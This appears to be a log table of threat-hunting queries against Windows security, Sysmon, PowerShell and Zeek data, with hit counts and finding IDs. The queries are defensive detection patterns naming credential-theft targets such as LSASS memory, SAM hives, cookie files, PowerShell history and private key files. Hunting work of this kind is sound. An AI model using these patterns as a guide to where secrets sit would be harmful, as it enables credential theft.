| q-79ead2b591 | check C087 | search | {"dataset": "windows.security", "query": "event.code:4663 AND (win.ObjectName:*wwwroot* OR win.ObjectName:*inetpub* OR win.ObjectName:*login*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.… | 0 |  |
| q-591dad39a1 | check C088 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 5337 |  |
| q-9b6191c611 | check C089 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*wwwroot* OR powershell.script_block_text:*login* OR powershell.script_block_text:*credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.n… | 0 |  |
| q-85dba28e21 | check C090 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-cea74980f8 | check C091 | search | {"dataset": "zeek", "query": "event.action:http AND (url.original:*login* OR url.original:*portal*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "… | 0 |  |
| q-1545a32e7f | check C092 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-292dd5627c | check C093 | aggregate | {"dataset": "windows.sysmon", "field": "win.SourceImage", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-e3cb2e65b3 | check C094 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 20259 |  |
| q-a8f56fbe8e | check C095 | search | {"dataset": "windows.sysmon", "query": "event.code:8", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinatio… | 95 |  |
| q-a1ff355c25 | check C096 | aggregate | {"dataset": "windows.security", "field": "win.CallerProcessName", "query": "event.code:4656 AND win.ObjectType:*Process*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 13 |  |
| q-28eb796fd0 | check C097 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:*hook* OR powershell.script_block_text:*SetWindowsHookEx* OR powershell.script_block_text:*MiniDump*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.… | 0 |  |
| q-2eb47de6b6 | check C098 | search | {"dataset": "windows.other", "query": "message:*hook* OR message:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sou… | 0 |  |
| q-2cd07d2d3d | check C099 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-4c8b9a43b5 | check C100 | aggregate | {"dataset": "windows.security", "field": "source.ip", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-63634f1368 | check C101 | timeline | {"dataset": "windows.security", "query": "event.code:4625", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-ccc9707e54 | check C102 | search | {"dataset": "windows.other", "query": "message:*logon* OR message:*password*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 2 |  |
| q-50bc6a04f6 | check C103 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:*Credential* OR powershell.script_block_text:*Password*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.n… | 0 |  |
| q-64583f8b60 | check C104 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*net* OR process.command_line:*login*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 30 |  |
| q-f234eeb02e | check C105 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-a819d7df0e | check C106 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 0 |  |
| q-d2b84fc673 | check C107 | timeline | {"dataset": "windows.security", "query": "event.code:4625", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-e3321ef314 | check C108 | search | {"dataset": "windows.other", "query": "message:*4625* OR message:*failed*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 2 | F14 |
| q-2623e341b9 | check C109 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:*Password* OR powershell.script_block_text:*Credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.n… | 0 |  |
| q-66c350c00c | check C110 | aggregate | {"dataset": "windows.sysmon", "field": "process.command_line", "query": "event.code:1 AND process.command_line:*password*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-516f187055 | check C111 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 OR event.code:4656 OR event.code:4670", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-f60bac5e8a | check C112 | aggregate | {"dataset": "windows.security", "field": "win.ProcessName", "query": "event.code:4663 AND (win.ObjectName:*SAM* OR win.ObjectName:*SECURITY*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-f591b11ddb | check C113 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*hash* OR process.command_line:*crack*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-a19785c881 | check C114 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11 AND (win.TargetFilename:*.txt OR win.TargetFilename:*.pot)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 20 |  |
| q-7c0792860b | check C115 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10 AND (win.TargetImage:*lsass* OR win.TargetImage:*SAM*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-7d17e362d0 | check C116 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:*hash* OR powershell.script_block_text:*ConvertTo-SecureString*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code",… | 0 |  |
| q-6005f5423e | check C117 | search | {"dataset": "windows.other", "query": "message:*SAM* OR message:*hash*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sourc… | 1 |  |
| q-20c950a9a9 | check C118 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-eec983a861 | check C119 | aggregate | {"dataset": "windows.security", "field": "source.ip", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-e93aa4dc0a | check C120 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 15 | F16 |
| q-2a366a0c7b | check C121 | timeline | {"dataset": "windows.security", "query": "event.code:4625", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-35c560b269 | check C122 | search | {"dataset": "windows.other", "query": "message:*logon* OR message:*account*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "… | 7 | F16 |
| q-55cb9868d3 | check C123 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:*Password* OR powershell.script_block_text:*Credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.n… | 0 |  |
| q-c4609153bd | check C124 | aggregate | {"dataset": "windows.sysmon", "field": "process.command_line", "query": "event.code:1 AND process.command_line:*user*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1 |  |
| q-adffe8f358 | check C125 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-51d87cfe50 | check C126 | aggregate | {"dataset": "windows.security", "field": "source.ip", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-e67259b37d | check C127 | timeline | {"dataset": "windows.security", "query": "event.code:4625", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-aae8b8ef98 | check C128 | search | {"dataset": "windows.other", "query": "message:*logon* OR message:*credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line"… | 4 | F17 |
| q-4255420b96 | check C129 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:*Credential* OR powershell.script_block_text:*Password*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.n… | 0 |  |
| q-02260f8b31 | check C130 | aggregate | {"dataset": "windows.sysmon", "field": "process.command_line", "query": "event.code:1 AND process.command_line:*password*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-08652da542 | check C131 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-8d0ed2eeda | check C132 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 15 |  |
| q-6695be2625 | check C133 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-da6324f6e5 | check C134 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND registry.path:*Credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command… | 11 | F18 |
| q-780332f285 | check C135 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND powershell.script_block_text:*Credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executab… | 0 |  |
| q-e26232d97d | check C136 | search | {"dataset": "windows.other", "query": "message:*Credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "des… | 2 | F18 |
| q-c7a5aa34a7 | check C137 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:4656 OR event.code:4663 OR event.code:4670", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-097883437c | check C138 | search | {"dataset": "windows.security", "query": "event.code:5140 OR event.code:5145", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 163 |  |
| q-e48bf86c17 | check C139 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1649 |  |
| q-9e276ebe2a | check C140 | search | {"dataset": "windows.sysmon", "query": "event.code:3 AND (destination.port:445 OR destination.port:139)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable… | 66 |  |
| q-949a08277c | check C141 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*445* OR powershell.script_block_text:*WebDAV* OR powershell.script_block_text:*NTLM*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "ob… | 0 |  |
| q-b190c0407b | check C142 | search | {"dataset": "windows.other", "query": "message:*445* OR message:*WebDAV*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sou… | 0 |  |
| q-3e20cab41d | check C143 | aggregate | {"dataset": "zeek", "field": "destination.port", "query": "event.action:conn AND (destination.port:445 OR destination.port:139)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 50 |  |
| q-a7bf52c45b | check C144 | search | {"dataset": "zeek", "query": "event.action:http AND (http.request.method:PROPFIND OR http.request.method:MOVE OR http.request.method:OPTIONS)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.c… | 36 |  |
| q-5f353e5149 | check C145 | aggregate | {"dataset": "windows.security", "field": "event.code", "query": "event.code:4768 OR event.code:4769 OR event.code:4770", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 42 |  |
| q-3c66052797 | check C146 | search | {"dataset": "windows.security", "query": "event.code:4769", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 28 | F22 |
| q-c33aa1fd23 | check C147 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-e7dbf84759 | check C148 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.GrantedAccess:*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line",… | 39283 |  |
| q-c225fa81a9 | check C149 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Invoke-* OR powershell.script_block_text:*Exploit*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "ev… | 0 |  |
| q-21af7ad4c4 | check C150 | search | {"dataset": "windows.other", "query": "message:*exploit*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destin… | 0 |  |
| q-febe6d3e74 | check C151 | search | {"dataset": "zeek", "query": "event.action:notice OR event.action:weird", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sour… | 14 | F22 |
| q-0538754cbb | check C152 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 460 |  |
| q-37cf61026b | check C153 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*cookie* OR process.command_line:*Cookie*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.nam… | 5 | F23 |
| q-b7cef7670d | check C154 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1649 |  |
| q-6019192211 | check C155 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (win.TargetFilename:*Cookies* OR win.TargetFilename:*cookie*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pr… | 1 | F23 |
| q-a27e926eab | check C156 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-cb0d85db70 | check C157 | search | {"dataset": "windows.sysmon", "query": "event.code:2 AND (win.TargetFilename:*Cookies* OR win.TargetFilename:*cookie*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pro… | 0 |  |
| q-f8c57f62ff | check C158 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*cookie* OR powershell.script_block_text:*Cookie*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "even… | 0 |  |
| q-1652784551 | check C159 | search | {"dataset": "windows.other", "query": "message:*cookie*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destina… | 0 |  |
| q-e5bb913124 | check C160 | search | {"dataset": "zeek", "query": "event.action:http AND http.request.method:GET", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "… | 2 |  |
| q-e93e76b7f7 | check C161 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 460 |  |
| q-0b3e8cf6fc | check C162 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*password* OR process.command_line:*credential* OR process.command_line:*unattend*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name",… | 0 |  |
| q-7df0eb8cba | check C163 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1649 |  |
| q-739ddaa94a | check C164 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (win.TargetFilename:*unattend* OR win.TargetFilename:*password* OR win.TargetFilename:*credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.da… | 1 |  |
| q-edc41ac53c | check C165 | aggregate | {"dataset": "windows.sysmon", "field": "registry.path", "query": "event.code:13 OR event.code:14", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 17541 |  |
| q-8c80d4ab4c | check C166 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND (registry.path:*Password* OR registry.path:*Credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process… | 17 | F26 |
| q-7c3f69a909 | check C167 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*password* OR powershell.script_block_text:*credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset",… | 0 |  |
| q-d71f812202 | check C168 | search | {"dataset": "windows.other", "query": "message:*password*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 0 |  |
| q-c9aee909ee | check C169 | search | {"dataset": "zeek", "query": "event.action:smb_files", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinatio… | 12 |  |
| q-e66f1f0482 | check C170 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-fad9c1e924 | check C171 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 15 |  |
| q-1e10fbc39c | check C172 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 447 |  |
| q-45d9e0305c | check C173 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*password* OR process.command_line:*credential* OR process.command_line:*config*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event… | 8 |  |
| q-7116544b0b | check C174 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1649 |  |
| q-ff18aef4fc | check C175 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (win.TargetFilename:*.config OR win.TargetFilename:*.xml OR win.TargetFilename:*.txt)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event… | 44 |  |
| q-455b539f4e | check C176 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Get-Content* OR powershell.script_block_text:*Select-String*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dat… | 0 |  |
| q-1e21ab9849 | check C177 | search | {"dataset": "windows.other", "query": "message:*password*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 0 |  |
| q-c7cee6928f | check C178 | search | {"dataset": "zeek", "query": "event.action:smb_files", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinatio… | 12 |  |
| q-57bbb8e5bb | check C179 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"13\" AND (TO_LOWER(registry.path) LIKE \"*\\\\sam\\\\*\" OR TO_LOWER(registry.path) LIKE \"*\\\\security\\\\*\" OR TO_LOWER(registry.path) LIKE \"*password*\" OR TO_LOWER… | ERROR |  |
| q-c4c718900e | check C179 (repaired) | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"13\" AND (TO_LOWER(registry.path) LIKE \"*sam*\" OR TO_LOWER(registry.path) LIKE \"*security*\" OR TO_LOWER(registry.path) LIKE \"*password*\" OR TO_LOWER(registry.path) … | 170 |  |
| q-39ae2356ad | check C180 | aggregate | {"dataset": "windows.sysmon", "field": "registry.path", "query": "event.code:13", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 17541 |  |
| q-cd7b204a00 | check C181 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*reg query*\" OR TO_LOWER(process.command_line) LIKE \"*reg save*\" OR TO_LOWER(process.command_line) LIKE \"*\\\\sam*\" OR… | ERROR |  |
| q-9b803d1c66 | check C181 (repaired) | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*reg query*\" OR TO_LOWER(process.command_line) LIKE \"*reg save*\" OR TO_LOWER(process.command_line) LIKE \"*sam*\" OR TO_… | 5 |  |
| q-f84ae54b50 | check C182 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4670\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*\\\\sam*\" OR TO_LOWER(win.ObjectName) LIKE \"*\\\\security*\" OR TO_LOWER(win.ObjectName) LIK… | ERROR |  |
| q-919172fc9d | check C182 (repaired) | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4670\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*sam*\" OR TO_LOWER(win.ObjectName) LIKE \"*security*\" OR TO_LOWER(win.ObjectName) LIKE \"*lsa… | 500 |  |
| q-9c151d4574 | check C183 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(powershell.script_block_text, win.ScriptBlockText, \"\")) LIKE \"*reg query*\" OR TO_LOWER(COALESCE(powershell.script_block_t… | ERROR |  |
| q-113f8661d2 | check C183 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*reg query*\" OR TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*reg save*\" OR TO_L… | 1 |  |
| q-e5565cfe04 | check C184 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*\\\\sam*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*\\\\security*\" OR TO_LOWER(COALESCE(message, win.Message, \"\"… | ERROR |  |
| q-2a1829e9c5 | check C184 (repaired) | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*\\\\\\\\sam*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*\\\\\\\\security*\" OR TO_LOWER(COALESCE(message, win.Messa… | 3 |  |
| q-b9232e31f9 | check C185 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(powershell.script_block_text, win.ScriptBlockText, \"\")) LIKE \"*history*\" OR TO_LOWER(COALESCE(powershell.script_block_tex… | ERROR |  |
| q-61c1347c66 | check C185 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*history*\" OR TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*consolehost_history*\… | 1 |  |
| q-51abff70cc | check C186 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*consolehost_history*\" OR TO_LOWER(process.command_line) LIKE \"*psreadline*\" OR TO_LOWER(process.command_line) LIKE \"*h… | 0 |  |
| q-4b301ef889 | check C187 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*consolehost_history*\" OR TO_LOWER(file.path) LIKE \"*psreadline*\" OR TO_LOWER(file.path) LIKE \"*\\\\history*\" OR TO_LOWER(file.p… | ERROR |  |
| q-66f6475ed8 | check C187 (repaired) | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*consolehost_history*\" OR TO_LOWER(file.path) LIKE \"*psreadline*\" OR TO_LOWER(file.path) LIKE \"*history*\" OR TO_LOWER(file.path)… | 15 |  |
| q-4ee802116f | check C188 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*consolehost_history*\" OR TO_LOWER(win.ObjectName) LIKE \"*psreadline*\" OR TO_LOWER(win.ObjectName) LI… | 0 |  |
| q-bc6922dbf9 | check C189 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*history*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*psreadline*\" \| KEEP @timestamp, host.name, event.code, messag… | 5 |  |
| q-187d1de191 | check C190 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*.key\" OR TO_LOWER(file.path) LIKE \"*.pgp\" OR TO_LOWER(file.path) LIKE \"*.gpg\" OR TO_LOWER(file.path) LIKE \"*.ppk\" OR TO_LOWER… | 1 |  |
| q-89591e6bbc | check C191 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*.pem*\" OR TO_LOWER(process.command_line) LIKE \"*.pfx*\" OR TO_LOWER(process.command_line) LIKE \"*.p12*\" OR TO_LOWER(pr… | 0 |  |
| q-a61a4caee2 | check C192 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"5145\" AND (TO_LOWER(win.RelativeTargetName) LIKE \"*.key\" OR TO_LOWER(win.RelativeTargetName) LIKE \"*.pem\" OR TO_LOWER(win.RelativeTargetName) LIKE \"*.pfx\" OR TO_… | 0 |  |
| q-c0be90776b | check C193 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*.key\" OR TO_LOWER(win.ObjectName) LIKE \"*.pem\" OR TO_LOWER(win.ObjectName) LIKE \"*.pfx\" OR TO_LOWE… | 0 |  |
| q-f05ee030df | check C194 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(powershell.script_block_text, win.ScriptBlockText, \"\")) LIKE \"*.pem*\" OR TO_LOWER(COALESCE(powershell.script_block_text, … | ERROR |  |
| q-67422d2f19 | check C194 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*.pem*\" OR TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*.pfx*\" OR TO_LOWER(COAL… | 2 |  |
| q-96e25d04b3 | check C195 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*.pem*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*.pfx*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*… | 0 |  |
